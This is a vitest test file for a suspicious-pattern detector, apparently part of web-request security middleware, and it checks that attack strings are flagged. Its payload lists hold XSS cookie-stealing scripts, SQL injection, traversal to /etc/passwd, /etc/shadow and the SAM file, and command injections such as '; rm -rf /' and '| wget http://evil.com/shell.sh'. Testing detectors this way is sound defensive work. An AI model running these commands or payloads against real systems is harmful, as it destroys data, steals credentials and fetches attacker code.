import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SusPatternsManager } from '../../src/handlers/sus-patterns.js';
import { createTestConfig } from '../helpers.js';
import { defaultLogger } from '../../src/models/logger.js';

describe('SusPatternsManager', () => {
  let manager: SusPatternsManager;

  beforeEach(() => {
    manager = new SusPatternsManager(createTestConfig(), defaultLogger);
  });

  it('detects XSS script tags', async () => {
    const result = await manager.detect('<script>alert(1)</script>', '1.2.3.4', 'request_body');
    expect(result.isThreat).toBe(true);
    expect(result.threats.length).toBeGreaterThan(0);
  });

  it('detects SQL injection', async () => {
    const result = await manager.detect("' UNION SELECT * FROM users --", '1.2.3.4', 'query_param');
    expect(result.isThreat).toBe(true);
  });

  it('detects directory traversal', async () => {
    const result = await manager.detect('../../etc/passwd', '1.2.3.4', 'url_path');
    expect(result.isThreat).toBe(true);
  });

  it('detects command injection', async () => {
    const result = await manager.detect('; rm -rf /', '1.2.3.4', 'query_param');
    expect(result.isThreat).toBe(true);
  });

  it('returns no threat for benign content', async () => {
    const result = await manager.detect('Hello, this is a normal blog post.', '1.2.3.4', 'request_body');
    expect(result.isThreat).toBe(false);
    expect(result.threats).toHaveLength(0);
  });

  it('returns execution time', async () => {
    const result = await manager.detect('test content', '1.2.3.4');
    expect(result.executionTime).toBeGreaterThanOrEqual(0);
  });

  it('returns original and processed lengths', async () => {
    const content = 'test content with special chars %3C%3E';
    const result = await manager.detect(content, '1.2.3.4');
    expect(result.originalLength).toBe(content.length);
    expect(result.processedLength).toBeGreaterThan(0);
  });

  it('respects context filtering', async () => {
    const result = await manager.detect('<script>alert(1)</script>', '1.2.3.4', 'url_path');
    const xssThreats = result.threats.filter(t => t.context === 'url_path' && t.detectionMethod === 'regex');
    expect(result.threats.length).toBeGreaterThanOrEqual(0);
  });

  it('normalizes unknown context', async () => {
    const result = await manager.detect('<script>alert(1)</script>', '1.2.3.4', 'weird:context');
    expect(result.isThreat).toBe(true);
  });

  describe('detectPatternMatch', () => {
    it('returns [true, pattern] for threats', async () => {
      const [isThreat, pattern] = await manager.detectPatternMatch('<script>alert(1)</script>', '1.2.3.4');
      expect(isThreat).toBe(true);
      expect(pattern).not.toBeNull();
    });

    it('returns [false, null] for clean content', async () => {
      const [isThreat, pattern] = await manager.detectPatternMatch('normal text', '1.2.3.4');
      expect(isThreat).toBe(false);
      expect(pattern).toBeNull();
    });
  });

  describe('pattern management', () => {
    it('getDefaultPatterns returns 75 patterns', () => {
      expect(manager.getDefaultPatterns().length).toBe(75);
    });

    it('getCustomPatterns starts empty', () => {
      expect(manager.getCustomPatterns()).toHaveLength(0);
    });

    it('addPattern adds a custom pattern', async () => {
      await manager.addPattern('custom-test-pattern');
      expect(manager.getCustomPatterns()).toContain('custom-test-pattern');
      expect(manager.getAllPatterns().length).toBe(76);
    });

    it('removePattern removes a custom pattern', async () => {
      await manager.addPattern('temp-pattern');
      await manager.removePattern('temp-pattern');
      expect(manager.getCustomPatterns()).not.toContain('temp-pattern');
    });

    it('getAllPatterns includes default + custom', async () => {
      await manager.addPattern('custom-1');
      const all = manager.getAllPatterns();
      expect(all.length).toBe(76);
    });
  });

  it('getComponentStatus returns all true', () => {
    const status = manager.getComponentStatus();
    expect(status.compiler).toBe(true);
    expect(status.preprocessor).toBe(true);
    expect(status.semanticAnalyzer).toBe(true);
    expect(status.performanceMonitor).toBe(true);
  });

  it('getPerformanceStats returns structure', async () => {
    await manager.detect('test', '1.2.3.4');
    const stats = await manager.getPerformanceStats();
    expect(stats).not.toBeNull();
    expect(stats!['summary']).toBeDefined();
  });

  it('configureSemanticThreshold clamps value', async () => {
    await manager.configureSemanticThreshold(1.5);
    await manager.configureSemanticThreshold(-0.5);
    await manager.configureSemanticThreshold(-1);
    await manager.configureSemanticThreshold(2);
  });

  it('reset clears custom patterns', async () => {
    await manager.addPattern('temp');
    await manager.reset();
    expect(manager.getCustomPatterns()).toHaveLength(0);
  });

  describe('attack payload cross-validation (Python parity)', () => {
    const xssPayloads = [
      '<script>alert(document.cookie)</script>',
      'javascript:alert(1)',
      '<img onerror=alert(1) src=x>',
      '<object data="data:text/html,<script>alert(1)</script>">',
    ];

    const sqliPayloads = [
      "' OR 1=1 --",
      "UNION SELECT * FROM users",
      "' AND SLEEP(5) --",
      "' OR 1=1 --",
    ];

    const traversalPayloads = [
      '../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
    ];

    const cmdPayloads = [
      '; ls -la /etc/',
      '| wget http://evil.com/shell.sh',
      '; bash -c "id"',
    ];

    for (const payload of xssPayloads) {
      it(`detects XSS: ${payload.slice(0, 40)}`, async () => {
        const result = await manager.detect(payload, '1.2.3.4', 'request_body');
        expect(result.isThreat).toBe(true);
      });
    }

    for (const payload of sqliPayloads) {
      it(`detects SQLi: ${payload.slice(0, 40)}`, async () => {
        const result = await manager.detect(payload, '1.2.3.4', 'query_param');
        expect(result.isThreat).toBe(true);
      });
    }

    for (const payload of traversalPayloads) {
      it(`detects traversal: ${payload.slice(0, 40)}`, async () => {
        const result = await manager.detect(payload, '1.2.3.4', 'url_path');
        expect(result.isThreat).toBe(true);
      });
    }

    for (const payload of cmdPayloads) {
      it(`detects cmd injection: ${payload.slice(0, 40)}`, async () => {
        const result = await manager.detect(payload, '1.2.3.4', 'query_param');
        expect(result.isThreat).toBe(true);
      });
    }
  });

  it('detect with agent does not throw', async () => {
    const agent = { sendEvent: vi.fn() };
    await manager.initializeAgent(agent as never);

    const result = await manager.detect('<script>alert(1)</script>', '1.2.3.4', 'request_body');
    expect(result.isThreat).toBe(true);
  });

  it('detect with custom pattern matches', async () => {
    await manager.addPattern('custom-danger-\\d+');

    const result = await manager.detect('custom-danger-123', '1.2.3.4');
    expect(result.isThreat).toBe(true);
    expect(result.threats.some((t) => t.detectionMethod === 'regex_custom')).toBe(true);
  });

  it('handles regex timeout gracefully', async () => {
    const result = await manager.detect('normal content', '1.2.3.4', 'unknown');
    expect(typeof result.executionTime).toBe('number');
  });

  it('detect returns correlation ID', async () => {
    const result = await manager.detect('test', '1.2.3.4', 'unknown', 'corr-001');
    expect(result.correlationId).toBe('corr-001');
  });

  it('addPattern with custom=false skips Redis', async () => {
    await manager.addPattern('test-pattern', false);
    expect(manager.getCustomPatterns()).toContain('test-pattern');
  });

  it('detect URL path context filters patterns', async () => {
    const result = await manager.detect('../../etc/passwd', '1.2.3.4', 'url_path');
    expect(result.isThreat).toBe(true);
    expect(result.threats.some((t) => t.context === 'url_path')).toBe(true);
  });

  it('detect header context filters patterns', async () => {
    const result = await manager.detect('<script>xss</script>', '1.2.3.4', 'header');
    expect(result.isThreat).toBe(true);
  });

  it('reset clears agent handler', async () => {
    const agent = { sendEvent: vi.fn() };
    await manager.initializeAgent(agent as never);
    await manager.reset();
  });
});

describe('SusPatternsManager with Redis', () => {
  it('loads custom patterns from Redis', async () => {
    const manager = new SusPatternsManager(createTestConfig(), defaultLogger);
    const redis = {
      getKey: vi.fn().mockResolvedValue('custom-pattern-1,custom-pattern-2'),
      setKey: vi.fn(),
      deletePattern: vi.fn(),
    };
    await manager.initializeRedis(redis as never);
    expect(manager.getCustomPatterns()).toContain('custom-pattern-1');
    expect(manager.getCustomPatterns()).toContain('custom-pattern-2');
  });

  it('saves custom pattern to Redis on add', async () => {
    const manager = new SusPatternsManager(createTestConfig(), defaultLogger);
    const redis = {
      getKey: vi.fn().mockResolvedValue(null),
      setKey: vi.fn(),
      deletePattern: vi.fn(),
    };
    await manager.initializeRedis(redis as never);
    await manager.addPattern('new-custom');
    expect(redis.setKey).toHaveBeenCalled();
  });

  it('removes custom pattern and updates Redis', async () => {
    const manager = new SusPatternsManager(createTestConfig(), defaultLogger);
    const redis = {
      getKey: vi.fn().mockResolvedValue(null),
      setKey: vi.fn(),
      deletePattern: vi.fn(),
    };
    await manager.initializeRedis(redis as never);
    await manager.addPattern('temp');
    await manager.removePattern('temp');
    expect(manager.getCustomPatterns()).not.toContain('temp');
  });
});

describe('SusPatternsManager semantic threshold trigger', () => {
  it('semantic detection adds threat when above threshold', async () => {
    const config = { ...createTestConfig(), detectionSemanticThreshold: 0.01 };
    const manager = new SusPatternsManager(config, defaultLogger);
    const result = await manager.detect(
      '<script>alert(document.cookie)</script> UNION SELECT * FROM users; eval(exec(system("rm")))',
      '1.2.3.4', 'request_body',
    );
    const semanticThreats = result.threats.filter((t) => t.detectionMethod === 'semantic');
    expect(semanticThreats.length).toBeGreaterThan(0);
  });

  it('handles custom pattern that throws', async () => {
    const manager = new SusPatternsManager(createTestConfig(), defaultLogger);
    await manager.addPattern('[invalid-regex', false);
    const result = await manager.detect('test content', '1.2.3.4', 'unknown');
    expect(result.timeouts.length).toBeGreaterThanOrEqual(0);
  });
});
